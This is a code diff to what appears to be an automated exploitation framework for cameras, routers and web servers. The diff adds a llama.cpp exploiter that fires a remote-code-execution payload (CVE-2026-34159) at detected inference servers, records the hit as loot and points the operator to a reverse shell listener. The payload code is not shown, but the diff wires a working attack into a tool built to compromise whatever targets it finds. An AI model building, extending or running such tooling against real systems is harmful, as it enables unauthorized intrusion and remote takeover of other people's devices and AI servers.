@@ -14,6 +14,7 @@ from engines.hikvision_module import HikvisionExploiter
 from engines.ssh_engine import SSHEngine
 from engines.fuzzer_module import Fuzzer
 from engines.zte_module import ZTEExploiter
+from engines.llama_cpp_module import LlamaCppExploiter
 from engines.browser_automation import BrowserAutomation
 from engines.external_tools import ExternalTools
 from engines.camera_viewer import CameraViewer
@@ -237,13 +238,20 @@ def main(target_input, manual_mode=False):
         is_hikvision = device_type == "HIKVISION"
         is_zte = device_type == "ZTE"
         is_dahua = device_type == "DAHUA"
+        is_llama = device_type == "LLAMA_CPP"
 
         is_openwrt = device_type == "OPENWRT"
         is_netis = device_type == "NETIS"
 
         # محاولة الاستغلال السريع قبل الفحص الطويل
-        if is_laravel or is_hikvision or is_zte or is_dahua or is_openwrt or is_netis:
+        if is_laravel or is_hikvision or is_zte or is_dahua or is_openwrt or is_netis or is_llama:
             log(f"High-Value Target Detected ({device_type}). Running specialized exploiters FIRST...", "PWN")
+            
+            if is_llama:
+                llama_exp = LlamaCppExploiter(ip, port)
+                if llama_exp.run_exploit():
+                    loot.add_note(f"CVE-2026-34159: Potential llama.cpp RCE exploit sent on port {port}. Check reverse shell listener.")
+                    save_success(ip, f"llama.cpp ({port})", "CVE-2026-34159 RCE payload delivered")
             
             if is_laravel:
                 lex = LaravelExploiter(target_url)
